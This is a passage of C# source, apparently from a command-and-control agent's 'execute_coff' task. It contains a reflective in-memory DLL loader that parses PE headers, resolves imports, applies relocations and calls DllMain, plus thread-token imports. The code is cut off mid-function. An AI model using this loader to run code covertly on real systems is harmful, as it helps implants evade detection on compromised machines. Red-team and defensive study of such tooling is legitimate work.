#define COMMAND_NAME_UPPER

#if DEBUG
#define EXECUTE_COFF
#endif

#if EXECUTE_COFF

using ApolloInterop.Classes;
using ApolloInterop.Classes.Api;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Utils;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security.Principal;
using System.Text;
using System.Threading;
using static Tasks.execute_coff;


namespace Tasks
{
    public class execute_coff : Tasking
    {
        [DataContract]
        internal struct CoffParameters
        {
            [DataMember(Name = "coff_name")]
            public string CoffName;
            [DataMember(Name = "function_name")]
            public string FunctionName;
            [DataMember(Name = "timeout")]
            public int timeout;
            [DataMember(Name = "coff_arguments")]
            public String PackedArguments;
            [DataMember(Name = "bof_id")]
            public string BofId;
            [DataMember(Name = "coff_id")]
            public string CoffLoaderId;
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int RunCOFFDelegate(string functionname, IntPtr coff_data, uint filesize, IntPtr argumentdata, int argumentSize);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate IntPtr UnhexlifyDelegate([MarshalAs(UnmanagedType.LPStr)] string value, [In, Out] ref int outlen);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate IntPtr BeaconGetOutputDataDelegate([In, Out] ref int outsize);
        // Add imported SetThreadToken API for thread token manipulation
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetThreadToken(
            ref IntPtr ThreadHandle,
            IntPtr Token);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentThread();

        private static RunCOFFDelegate? _RunCOFF;
        private static UnhexlifyDelegate? _Unhexlify;
        private static BeaconGetOutputDataDelegate? _BeaconGetOutputData;
        public execute_coff(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {

        }
        // claude version
        public class MemoryModule : IDisposable
        {
            #region Native Methods

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern void CopyMemory(IntPtr destination, IntPtr source, UIntPtr length);

            [DllImport("kernel32.dll", EntryPoint = "RtlZeroMemory", SetLastError = true)]
            private static extern void ZeroMemory(IntPtr dest, UIntPtr size);

            [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

            [DllImport("kernel32.dll", SetLastError = true, EntryPoint = "GetProcAddress")]
            private static extern IntPtr GetProcAddressByOrdinal(IntPtr hModule, IntPtr lpProcOrdinal);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern IntPtr LoadLibrary(string lpFileName);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern bool FreeLibrary(IntPtr hModule);

            #endregion

            #region Constants

            // Memory allocation flags
            private const uint MEM_COMMIT = 0x1000;
            private const uint MEM_RESERVE = 0x2000;
            private const uint MEM_RELEASE = 0x8000;

            // Memory protection flags
            private const uint PAGE_NOACCESS = 0x01;
            private const uint PAGE_READONLY = 0x02;
            private const uint PAGE_READWRITE = 0x04;
            private const uint PAGE_WRITECOPY = 0x08;
            private const uint PAGE_EXECUTE = 0x10;
            private const uint PAGE_EXECUTE_READ = 0x20;
            private const uint PAGE_EXECUTE_READWRITE = 0x40;
            private const uint PAGE_EXECUTE_WRITECOPY = 0x80;
            private const uint PAGE_GUARD = 0x100;
            private const uint PAGE_NOCACHE = 0x200;
            private const uint PAGE_WRITECOMBINE = 0x400;

            // DLL Characteristics
            private const ushort IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE = 0x0040;
            private const ushort IMAGE_DLL_CHARACTERISTICS_NX_COMPAT = 0x0100;

            // Directory indexes for IMAGE_DATA_DIRECTORY
            private const int IMAGE_DIRECTORY_ENTRY_EXPORT = 0;
            private const int IMAGE_DIRECTORY_ENTRY_IMPORT = 1;
            private const int IMAGE_DIRECTORY_ENTRY_RESOURCE = 2;
            private const int IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3;
            private const int IMAGE_DIRECTORY_ENTRY_SECURITY = 4;
            private const int IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;
            private const int IMAGE_DIRECTORY_ENTRY_DEBUG = 6;
            private const int IMAGE_DIRECTORY_ENTRY_COPYRIGHT = 7;
            private const int IMAGE_DIRECTORY_ENTRY_GLOBALPTR = 8;
            private const int IMAGE_DIRECTORY_ENTRY_TLS = 9;
            private const int IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10;
            private const int IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT = 11;
            private const int IMAGE_DIRECTORY_ENTRY_IAT = 12;
            private const int IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT = 13;
            private const int IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR = 14;

            // Section characteristics
            private const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
            private const uint IMAGE_SCN_MEM_READ = 0x40000000;
            private const uint IMAGE_SCN_MEM_WRITE = 0x80000000;

            // Relocation types
            private const int IMAGE_REL_BASED_ABSOLUTE = 0;
            private const int IMAGE_REL_BASED_HIGH = 1;
            private const int IMAGE_REL_BASED_LOW = 2;
            private const int IMAGE_REL_BASED_HIGHLOW = 3;
            private const int IMAGE_REL_BASED_HIGHADJ = 4;
            private const int IMAGE_REL_BASED_DIR64 = 10;

            // DLL entry point function prototype
            private delegate bool DllEntryDelegate(IntPtr hinstDLL, uint fdwReason, IntPtr lpvReserved);

            // DLL entry reasons
            private const uint DLL_PROCESS_ATTACH = 1;
            private const uint DLL_THREAD_ATTACH = 2;
            private const uint DLL_THREAD_DETACH = 3;
            private const uint DLL_PROCESS_DETACH = 0;

            // PE Header offsets
            private const int PE_HEADER_OFFSET = 0x3C;
            private const int OPTIONAL_HEADER32_MAGIC = 0x10B;
            private const int OPTIONAL_HEADER64_MAGIC = 0x20B;

            #endregion

            #region Structures

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_DOS_HEADER
            {
                public ushort e_magic;
                public ushort e_cblp;
                public ushort e_cp;
                public ushort e_crlc;
                public ushort e_cparhdr;
                public ushort e_minalloc;
                public ushort e_maxalloc;
                public ushort e_ss;
                public ushort e_sp;
                public ushort e_csum;
                public ushort e_ip;
                public ushort e_cs;
                public ushort e_lfarlc;
                public ushort e_ovno;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
                public ushort[] e_res1;
                public ushort e_oemid;
                public ushort e_oeminfo;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
                public ushort[] e_res2;
                public int e_lfanew;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_FILE_HEADER
            {
                public ushort Machine;
                public ushort NumberOfSections;
                public uint TimeDateStamp;
                public uint PointerToSymbolTable;
                public uint NumberOfSymbols;
                public ushort SizeOfOptionalHeader;
                public ushort Characteristics;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_DATA_DIRECTORY
            {
                public uint VirtualAddress;
                public uint Size;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_OPTIONAL_HEADER32
            {
                public ushort Magic;
                public byte MajorLinkerVersion;
                public byte MinorLinkerVersion;
                public uint SizeOfCode;
                public uint SizeOfInitializedData;
                public uint SizeOfUninitializedData;
                public uint AddressOfEntryPoint;
                public uint BaseOfCode;
                public uint BaseOfData;
                public uint ImageBase;
                public uint SectionAlignment;
                public uint FileAlignment;
                public ushort MajorOperatingSystemVersion;
                public ushort MinorOperatingSystemVersion;
                public ushort MajorImageVersion;
                public ushort MinorImageVersion;
                public ushort MajorSubsystemVersion;
                public ushort MinorSubsystemVersion;
                public uint Win32VersionValue;
                public uint SizeOfImage;
                public uint SizeOfHeaders;
                public uint CheckSum;
                public ushort Subsystem;
                public ushort DllCharacteristics;
                public uint SizeOfStackReserve;
                public uint SizeOfStackCommit;
                public uint SizeOfHeapReserve;
                public uint SizeOfHeapCommit;
                public uint LoaderFlags;
                public uint NumberOfRvaAndSizes;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
                public IMAGE_DATA_DIRECTORY[] DataDirectory;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_OPTIONAL_HEADER64
            {
                public ushort Magic;
                public byte MajorLinkerVersion;
                public byte MinorLinkerVersion;
                public uint SizeOfCode;
                public uint SizeOfInitializedData;
                public uint SizeOfUninitializedData;
                public uint AddressOfEntryPoint;
                public uint BaseOfCode;
                public ulong ImageBase;
                public uint SectionAlignment;
                public uint FileAlignment;
                public ushort MajorOperatingSystemVersion;
                public ushort MinorOperatingSystemVersion;
                public ushort MajorImageVersion;
                public ushort MinorImageVersion;
                public ushort MajorSubsystemVersion;
                public ushort MinorSubsystemVersion;
                public uint Win32VersionValue;
                public uint SizeOfImage;
                public uint SizeOfHeaders;
                public uint CheckSum;
                public ushort Subsystem;
                public ushort DllCharacteristics;
                public ulong SizeOfStackReserve;
                public ulong SizeOfStackCommit;
                public ulong SizeOfHeapReserve;
                public ulong SizeOfHeapCommit;
                public uint LoaderFlags;
                public uint NumberOfRvaAndSizes;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
                public IMAGE_DATA_DIRECTORY[] DataDirectory;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_NT_HEADERS32
            {
                public uint Signature;
                public IMAGE_FILE_HEADER FileHeader;
                public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_NT_HEADERS64
            {
                public uint Signature;
                public IMAGE_FILE_HEADER FileHeader;
                public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_SECTION_HEADER
            {
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
                public byte[] Name;
                public uint PhysicalAddress;
                public uint VirtualAddress;
                public uint SizeOfRawData;
                public uint PointerToRawData;
                public uint PointerToRelocations;
                public uint PointerToLinenumbers;
                public ushort NumberOfRelocations;
                public ushort NumberOfLinenumbers;
                public uint Characteristics;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_IMPORT_DESCRIPTOR
            {
                public uint OriginalFirstThunk;
                public uint TimeDateStamp;
                public uint ForwarderChain;
                public uint Name;
                public uint FirstThunk;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_THUNK_DATA32
            {
                public uint ForwarderString;      // PBYTE
                public uint Function;             // PDWORD
                public uint Ordinal;              // DWORD
                public uint AddressOfData;        // PIMAGE_IMPORT_BY_NAME
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_THUNK_DATA64
            {
                public ulong ForwarderString;     // PBYTE
                public ulong Function;            // PDWORD
                public ulong Ordinal;             // DWORD
                public ulong AddressOfData;       // PIMAGE_IMPORT_BY_NAME
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_IMPORT_BY_NAME
            {
                public ushort Hint;
                // Variable length array of bytes follows
                // char Name[1];
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_BASE_RELOCATION
            {
                public uint VirtualAddress;
                public uint SizeOfBlock;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_EXPORT_DIRECTORY
            {
                public uint Characteristics;
                public uint TimeDateStamp;
                public ushort MajorVersion;
                public ushort MinorVersion;
                public uint Name;
                public uint Base;
                public uint NumberOfFunctions;
                public uint NumberOfNames;
                public uint AddressOfFunctions;
                public uint AddressOfNames;
                public uint AddressOfNameOrdinals;
            }

            #endregion

            #region Fields

            private IntPtr _baseAddress;
            private bool _disposed;
            private readonly Dictionary<string, IntPtr> _modules;
            private readonly bool _is64Bit;
            private readonly ulong _imageBase;
            private readonly uint _sizeOfImage;
            private readonly IntPtr _entryPoint;

            #endregion

            #region Constructor and Finalizer

            /// <summary>
            /// Loads a DLL from a byte array into memory.
            /// </summary>
            /// <param name="dllBytes">The DLL bytes to load.</param>
            public MemoryModule(byte[] dllBytes)
            {
                if (dllBytes == null || dllBytes.Length == 0)
                    throw new ArgumentNullException(nameof(dllBytes));

                _modules = new Dictionary<string, IntPtr>(StringComparer.OrdinalIgnoreCase);

                // Parse the PE header to determine if it's a 32-bit or 64-bit DLL
                GCHandle pinnedArray = GCHandle.Alloc(dllBytes, GCHandleType.Pinned);
                try
                {
                    IntPtr ptrData = pinnedArray.AddrOfPinnedObject();

                    // Read the DOS header
                    IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(ptrData, typeof(IMAGE_DOS_HEADER));
                    if (dosHeader.e_magic != 0x5A4D) // "MZ"
                        throw new BadImageFormatException("Invalid DOS header signature.");

                    // Read the PE header
                    IntPtr ptrNtHeader = IntPtr.Add(ptrData, dosHeader.e_lfanew);
                    uint peSignature = (uint)Marshal.ReadInt32(ptrNtHeader);
                    if (peSignature != 0x00004550) // "PE\0\0"
                        throw new BadImageFormatException("Invalid PE header signature.");

                    // Read the file header
                    IntPtr ptrFileHeader = IntPtr.Add(ptrNtHeader, 4);
                    IMAGE_FILE_HEADER fileHeader = (IMAGE_FILE_HEADER)Marshal.PtrToStructure(ptrFileHeader, typeof(IMAGE_FILE_HEADER));

                    // Check optional header magic to determine if it's 32-bit or 64-bit
                    IntPtr ptrOptionalHeader = IntPtr.Add(ptrFileHeader, Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)));
                    ushort magic = (ushort)Marshal.ReadInt16(ptrOptionalHeader);

                    if (magic == OPTIONAL_HEADER32_MAGIC)
                    {
                        _is64Bit = false;
                        IMAGE_OPTIONAL_HEADER32 optionalHeader = (IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure(ptrOptionalHeader, typeof(IMAGE_OPTIONAL_HEADER32));
                        _imageBase = optionalHeader.ImageBase;
                        _sizeOfImage = optionalHeader.SizeOfImage;
                    }
                    else if (magic == OPTIONAL_HEADER64_MAGIC)
                    {
                        _is64Bit = true;
                        IMAGE_OPTIONAL_HEADER64 optionalHeader = (IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(ptrOptionalHeader, typeof(IMAGE_OPTIONAL_HEADER64));
                        _imageBase = optionalHeader.ImageBase;
                        _sizeOfImage = optionalHeader.SizeOfImage;
                    }
                    else
                    {
                        throw new BadImageFormatException("Invalid optional header magic value.");
                    }

                    // Allocate memory for the DLL
                    _baseAddress = VirtualAlloc(IntPtr.Zero, (UIntPtr)_sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    if (_baseAddress == IntPtr.Zero)
                        throw new OutOfMemoryException("Failed to allocate memory for DLL.");

                    try
                    {
                        // Copy the headers
                        uint headerSize = _is64Bit
                            ? ((IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(ptrOptionalHeader, typeof(IMAGE_OPTIONAL_HEADER64))).SizeOfHeaders
                            : ((IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure(ptrOptionalHeader, typeof(IMAGE_OPTIONAL_HEADER32))).SizeOfHeaders;

                        if (headerSize > dllBytes.Length)
                            throw new BadImageFormatException("Header size is larger than the DLL data.");

                        Marshal.Copy(dllBytes, 0, _baseAddress, (int)headerSize);

                        // Map sections
                        IntPtr ptrSectionHeader = _is64Bit
                            ? IntPtr.Add(ptrOptionalHeader, Marshal.SizeOf(typeof(IMAGE_OPTIONAL_HEADER64)))
                            : IntPtr.Add(ptrOptionalHeader, Marshal.SizeOf(typeof(IMAGE_OPTIONAL_HEADER32)));

                        for (int i = 0; i < fileHeader.NumberOfSections; i++)
                        {
                            IMAGE_SECTION_HEADER sectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(ptrSectionHeader, typeof(IMAGE_SECTION_HEADER));

                            if (sectionHeader.SizeOfRawData > 0)
                            {
                                if (sectionHeader.PointerToRawData + sectionHeader.SizeOfRawData > dllBytes.Length)
                                    throw new BadImageFormatException("Section data extends beyond the DLL data.");

                                IntPtr destAddress = IntPtr.Add(_baseAddress, (int)sectionHeader.VirtualAddress);
                                IntPtr sourceAddress = IntPtr.Add(ptrData, (int)sectionHeader.PointerToRawData);
                                Marshal.Copy(dllBytes, (int)sectionHeader.PointerToRawData, destAddress, (int)sectionHeader.SizeOfRawData);
                            }

                            ptrSectionHeader = IntPtr.Add(ptrSectionHeader, Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)));
                        }

                        // Process imports
                        ProcessImports();

                        // Process relocations
                        ProcessRelocations();

                        // Set proper memory protection for sections
                        ProtectMemory();

                        // Get the entry point
                        uint entryPointRva = _is64Bit
                            ? ((IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(ptrOptionalHeader, typeof(IMAGE_OPTIONAL_HEADER64))).AddressOfEntryPoint
                            : ((IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure(ptrOptionalHeader, typeof(IMAGE_OPTIONAL_HEADER32))).AddressOfEntryPoint;

                        if (entryPointRva != 0)
                        {
                            _entryPoint = IntPtr.Add(_baseAddress, (int)entryPointRva);

                            // Call DllMain with DLL_PROCESS_ATTACH
                            DllEntryDelegate dllEntry = (DllEntryDelegate)Marshal.GetDelegateForFunctionPointer(_entryPoint, typeof(DllEntryDelegate));
                            bool result = dllEntry(_baseAddress, DLL_PROCESS_ATTACH, IntPtr.Zero);
                            if (!result)
                                throw new Exception("DllMain returned FALSE for DLL_PROCESS_ATTACH.");
                        }
                    }
                    catch
                    {
                        VirtualFree(_baseAddress, UIntPtr.Zero, MEM_RELEASE);
                        _baseAddress = IntPtr.Zero;
                        throw;
                    }
                }
                finally
                {
                    if (pinnedArray.IsAllocated)
                        pinnedArray.Free();
                }
            }

            ~MemoryModule()
            {
                Dispose(false);
            }

            #endregion

            #region Public Methods

            /// <summary>
            /// Gets a function pointer from the loaded DLL.
            /// </summary>
            /// <param name="functionName">The name of the function to get.</param>
            /// <returns>A pointer to the function.</returns>
            public IntPtr GetProcAddressFromMemory(string functionName)
            {
                if (_disposed)
                    throw new ObjectDisposedException(nameof(MemoryModule));

                if (string.IsNullOrEmpty(functionName))
                    throw new ArgumentNullException(nameof(functionName));

                if (_baseAddress == IntPtr.Zero)
                    throw new InvalidOperationException("DLL is not loaded.");

                // Find the export directory
                IntPtr ptrDosHeader = _baseAddress;
                IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(ptrDosHeader, typeof(IMAGE_DOS_HEADER));
                IntPtr ptrNtHeader = IntPtr.Add(_baseAddress, dosHeader.e_lfanew);

                IMAGE_DATA_DIRECTORY exportDirectory;
                if (_is64Bit)
                {
                    IMAGE_NT_HEADERS64 ntHeaders = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ptrNtHeader, typeof(IMAGE_NT_HEADERS64));
                    exportDirectory = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
                }
                else
                {
                    IMAGE_NT_HEADERS32 ntHeaders = (IMAGE_NT_HEADERS32)Marshal.PtrToStructure(ptrNtHeader, typeof(IMAGE_NT_HEADERS32));
                    exportDirectory = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
                }

                if (exportDirectory.VirtualAddress == 0 || exportDirectory.Size == 0)
                    throw new EntryPointNotFoundException($"Export directory not found for function: {functionName}");

                IntPtr ptrExportDirectory = IntPtr.Add(_baseAddress, (int)exportDirectory.VirtualAddress);
                IMAGE_EXPORT_DIRECTORY exportDir = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure(ptrExportDirectory, typeof(IMAGE_EXPORT_DIRECTORY));

                // Get the array of function addresses
                IntPtr ptrFunctions = IntPtr.Add(_baseAddress, (int)exportDir.AddressOfFunctions);
                // Get the array of function names
                IntPtr ptrNames = IntPtr.Add(_baseAddress, (int)exportDir.AddressOfNames);
                // Get the array of name ordinals
                IntPtr ptrNameOrdinals = IntPtr.Add(_baseAddress, (int)exportDir.AddressOfNameOrdinals);

                // Search for the function by name
                for (uint i = 0; i < exportDir.NumberOfNames; i++)
                {
                    uint nameRva = (uint)Marshal.ReadInt32(IntPtr.Add(ptrNames, (int)(i * 4)));
                    IntPtr ptrName = IntPtr.Add(_baseAddress, (int)nameRva);
                    string name = Marshal.PtrToStringAnsi(ptrName);

                    if (string.Equals(name, functionName, StringComparison.Ordinal))
                    {
                        ushort ordinal = (ushort)Marshal.ReadInt16(IntPtr.Add(ptrNameOrdinals, (int)(i * 2)));
                        uint functionRva = (uint)Marshal.ReadInt32(IntPtr.Add(ptrFunctions, (int)(ordinal * 4)));
                        IntPtr functionAddress = IntPtr.Add(_baseAddress, (int)functionRva);

                        // Check if it's a forwarder
                        if (functionRva >= exportDirectory.VirtualAddress &&
                            functionRva < exportDirectory.VirtualAddress + exportDirectory.Size)
                        {
                            // It's a forwarder, we need to load the referenced DLL
                            string forwarder = Marshal.PtrToStringAnsi(functionAddress);
                            int dotIndex = forwarder.IndexOf('.');
                            if (dotIndex <= 0)
                                throw new EntryPointNotFoundException($"Invalid forwarder: {forwarder}");

                            string dllName = forwarder.Substring(0, dotIndex) + ".dll";
                            string forwardedFunction = forwarder.Substring(dotIndex + 1);

                            // Load the forwarded DLL
                            IntPtr hModule;
                            if (!_modules.TryGetValue(dllName, out hModule))
                            {
                                hModule = LoadLibrary(dllName);
                                if (hModule == IntPtr.Zero)
                                    throw new DllNotFoundException($"Failed to load forwarded DLL: {dllName}");

                                _modules.Add(dllName, hModule);
                            }

                            // Get the forwarded function address
                            return GetProcAddress(hModule, forwardedFunction);
                        }

                        return functionAddress;
                    }
                }

                throw new EntryPointNotFoundException($"Function not found: {functionName}");
            }

            /// <summary>
            /// Gets a delegate for a function in the loaded DLL.
            /// </summary>
            /// <typeparam name="T">The type of delegate to return.</typeparam>
            /// <param name="functionName">The name of the function.</param>
            /// <returns>A delegate for the function.</returns>
            public T GetDelegate<T>(string functionName) where T : Delegate
            {
                IntPtr procAddress = GetProcAddressFromMemory(functionName);
                return (T)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(T));
            }

            #endregion

            #region Private Methods

            private void ProcessImports()
            {
                // Get pointers to PE headers
                IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(_baseAddress, typeof(IMAGE_DOS_HEADER));
                IntPtr ptrNtHeader = IntPtr.Add(_baseAddress, dosHeader.e_lfanew);

                // Get import directory
                IMAGE_DATA_DIRECTORY importDirectory;
                if (_is64Bit)
                {
                    IMAGE_NT_HEADERS64 ntHeaders = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ptrNtHeader, typeof(IMAGE_NT_HEADERS64));
                    importDirectory = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
                }
                else
                {
                    IMAGE_NT_HEADERS32 ntHeaders = (IMAGE_NT_HEADERS32)Marshal.PtrToStructure(ptrNtHeader, typeof(IMAGE_NT_HEADERS32));
                    importDirectory = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
                }

                if (importDirectory.VirtualAddress == 0 || importDirectory.Size == 0)
                    return; // No imports

                IntPtr ptrImportDesc = IntPtr.Add(_baseAddress, (int)importDirectory.VirtualAddress);
                int index = 0;

                while (true)
                {
                    IMAGE_IMPORT_DESCRIPTOR importDesc = (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(
                        IntPtr.Add(ptrImportDesc, index * Marshal.SizeOf(typeof(IMAGE_IMPORT_DESCRIPTOR))),
                        typeof(IMAGE_IMPORT_DESCRIPTOR));

                    // End of import descriptors
                    if (importDesc.Name == 0)
                        break;

                    // Get the DLL name
                    IntPtr ptrDllName = IntPtr.Add(_baseAddress, (int)importDesc.Name);
                    string dllName = Marshal.PtrToStringAnsi(ptrDllName);

                    // Load the DLL
                    IntPtr hModule;
                    if (!_modules.TryGetValue(dllName, out hModule))
                    {
                        hModule = LoadLibrary(dllName);
                        if (hModule == IntPtr.Zero)
                            throw new DllNotFoundException($"Failed to load imported DLL: {dllName}");

                        _modules.Add(dllName, hModule);
                    }

                    // Process the imports
                    IntPtr ptrFirstThunk = IntPtr.Add(_baseAddress, (int)importDesc.FirstThunk);
                    IntPtr ptrOriginalFirstThunk = importDesc.OriginalFirstThunk != 0
                        ? IntPtr.Add(_baseAddress, (int)importDesc.OriginalFirstThunk)
                        : ptrFirstThunk;

                    int thunkIndex = 0;
                    while (true)
                    {
                        IntPtr thunkAddress = IntPtr.Add(ptrFirstThunk, thunkIndex * (_is64Bit ? 8 : 4));
                        IntPtr originalThunkAddress = IntPtr.Add(ptrOriginalFirstThunk, thunkIndex * (_is64Bit ? 8 : 4));

                        ulong thunkData = _is64Bit
                            ? (ulong)Marshal.ReadInt64(originalThunkAddress)
                            : (uint)Marshal.ReadInt32(originalThunkAddress);

                        // End of imports for this DLL
                        if (thunkData == 0)
                            break;

                        IntPtr functionAddress;

                        if ((thunkData & (_is64Bit ? 0x8000000000000000 : 0x80000000)) != 0)
                        {
                            // Import by ordinal
                            uint ordinal = (uint)(thunkData & 0xFFFF);
                            // We need to add an additional declaration for the ordinal version of GetProcAddress
                            functionAddress = GetProcAddressByOrdinal(hModule, (IntPtr)ordinal);
                        }
                        else
                        {
                            // Import by name
                            IntPtr ptrImportByName = IntPtr.Add(_baseAddress, (int)thunkData);
                            IMAGE_IMPORT_BY_NAME importByName = (IMAGE_IMPORT_BY_NAME)Marshal.PtrToStructure(ptrImportByName, typeof(IMAGE_IMPORT_BY_NAME));
                            string functionName = Marshal.PtrToStringAnsi(IntPtr.Add(ptrImportByName, 2)); // Skip the Hint field (2 bytes)
                            functionAddress = GetProcAddress(hModule, functionName);
                        }

                        if (functionAddress == IntPtr.Zero)
                            throw new EntryPointNotFoundException($"Failed to find imported function: {dllName} - Function index {thunkIndex}");

                        // Write the function address to the IAT
                        if (_is64Bit)
                            Marshal.WriteInt64(thunkAddress, functionAddress.ToInt64());
                        else
                            Marshal.WriteInt32(thunkAddress, functionAddress.ToInt32());

                        thunkIndex++;
                    }

                    index++;
                }
            }

            private void ProcessRelocations()
            {
                // Check if relocations are necessary
                long delta = _baseAddress.ToInt64() - (long)_imageBase;
                if (delta == 0)
                    return; // No relocations needed

                // Get pointers to PE headers
                IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(_baseAddress, typeof(IMAGE_DOS_HEADER));
                IntPtr ptrNtHeader = IntPtr.Add(_baseAddress, dosHeader.e_lfanew);

                // Get relocation directory
                IMAGE_DATA_DIRECTORY relocationDirectory;
                if (_is64Bit)
                {
                    IMAGE_NT_HEADERS64 ntHeaders = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ptrNtHeader, typeof(IMAGE_NT_HEADERS64));
                    relocationDirectory = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
                }
                else
                {
                    IMAGE_NT_HEADERS32 ntHeaders = (IMAGE_NT_HEADERS32)Marshal.PtrToStructure(ptrNtHeader, typeof(IMAGE_NT_HEADERS32));
                    relocationDirectory = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
                }

                if (relocationDirectory.VirtualAddress == 0 || relocationDirectory.Size == 0)
                    return; // No relocations

                IntPtr ptrReloc = IntPtr.Add(_baseAddress, (int)relocationDirectory.VirtualAddress);
                uint remainingSize = relocationDirectory.Size;

                while (remainingSize > 0)
                {
                    IMAGE_BASE_RELOCATION relocation = (IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(ptrReloc, typeof(IMAGE_BASE_RELOCATION));
                    if (relocation.SizeOfBlock == 0)
                        break;

                    // Get the number of entries in this block
                    int entriesCount = (int)(relocation.SizeOfBlock - Marshal.SizeOf(typeof(IMAGE_BASE_RELOCATION))) / 2;

                    // Process each entry
                    for (int i = 0; i < entriesCount; i++)
                    {
                        // Read the relocation entry (2 bytes)
                        ushort entry = (ushort)Marshal.ReadInt16(IntPtr.Add(ptrReloc, Marshal.SizeOf(typeof(IMAGE_BASE_RELOCATION)) + i * 2));

                        // The high 4 bits indicate the type of relocation
                        int type = entry >> 12;

                        // The low 12 bits indicate the offset from the base address of the relocation block
                        int offset = entry & 0xFFF;

                        // Calculate the address to relocate
                        IntPtr ptrAddress = IntPtr.Add(_baseAddress, (int)relocation.VirtualAddress + offset);

                        // Apply the relocation based on type
                        switch (type)
                        {
                            case IMAGE_REL_BASED_ABSOLUTE:
                                // Do nothing, it's a padding entry
                                break;

                            case IMAGE_REL_BASED_HIGHLOW:
                                // 32-bit relocation
                                int value32 = Marshal.ReadInt32(ptrAddress);
                                Marshal.WriteInt32(ptrAddress, value32 + (int)delta);
                                break;

                            case IMAGE_REL_BASED_DIR64:
                                // 64-bit relocation
                                long value64 = Marshal.ReadInt64(ptrAddress);
                                Marshal.WriteInt64(ptrAddress, value64 + delta);
                                break;

                            case IMAGE_REL_BASED_HIGH:
                                // High 16-bits of a 32-bit relocation
                                ushort high = (ushort)Marshal.ReadInt16(ptrAddress);
                                Marshal.WriteInt16(ptrAddress, (short)(high + (short)((delta >> 16) & 0xFFFF)));
                                break;

